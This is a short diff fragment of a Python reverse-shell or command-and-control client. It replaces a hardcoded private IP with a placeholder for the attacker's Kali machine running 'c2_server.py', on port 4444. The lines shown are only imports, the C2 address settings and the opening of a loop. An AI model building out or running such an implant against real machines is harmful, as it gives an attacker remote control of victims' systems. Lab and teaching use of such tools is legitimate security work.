@@ -2,7 +2,7 @@ import socket
 import os
 import subprocess
 
-c2_ip = "192.168.208.128"
+c2_ip = "<KALI OR ATTACKER'S MACHINE IP WHERE THE C2 SERVER (c2_server.py) IS RUNNING FROM>"
 c2_port = 4444
 
 while True:
